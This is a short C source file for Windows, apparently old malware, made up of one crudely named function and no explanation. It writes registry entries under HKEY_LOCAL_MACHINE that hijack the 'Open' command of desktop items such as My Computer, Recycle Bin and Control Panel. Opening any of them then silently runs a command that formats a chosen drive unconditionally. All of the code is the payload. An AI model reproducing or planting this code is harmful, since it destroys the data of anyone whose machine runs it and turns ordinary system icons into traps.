   #include <windows.h>

   enum items { MY_COMPUTER, RECYCLE_BIN, INBOX, INTERNET_MAIL, INTERNET_NEWS,
           THE_INTERNET, MS_NETWORK, CONTROL_PANEL };

   void Fuckit(int Item, char drive) {
     DWORD X, Y;
     HKEY newkey;
     BYTE *Cmd = "start /minimized command /c echo y|format x: /u >nul";
     BYTE *Path[] = {
       "software\\classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\Shell\\Open\\Command",
       "software\\classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\Shell\\Open\\Command",
       "software\\classes\\CLSID\\{00020D76-0000-0000-C000-000000000046}\\Shell\\Open\\Command",
       "software\\classes\\CLSID\\{89292102-4755-11cf-9DC2-00AA006C2B84}\\Shell\\Open\\Command",
       "software\\classes\\CLSID\\{89292103-4755-11cf-9DC2-00AA006C2B84}\\Shell\\Open\\Command",
       "software\\classes\\CLSID\\{FBF23B42-E3F0-101B-8488-00AA003E56F8}\\Shell\\Open\\Command",
       "software\\classes\\CLSID\\{00028B00-0000-0000-C000-000000000046}\\Shell\\Open\\Command",
       "software\\classes\\CLSID\\{21EC2020-3AEA-1069-A2DD-08002B30309D}\\Shell\\Open\\Command"
     };

     X=0;
     while (Cmd[X] != 'x') X++;
     Cmd[X] = drive;

     RegCreateKeyEx(HKEY_LOCAL_MACHINE,
       Path[Item],
           0,
           "",
           REG_OPTION_NON_VOLATILE,
           KEY_ALL_ACCESS,
           NULL,
           &newkey,
           &Y
     );

     RegSetValueEx(newkey,
       "", // (Default) //
           0,
           REG_SZ,
           Cmd,
           strlen(Cmd)+1
     );
     Cmd[X] = 'x';
   }
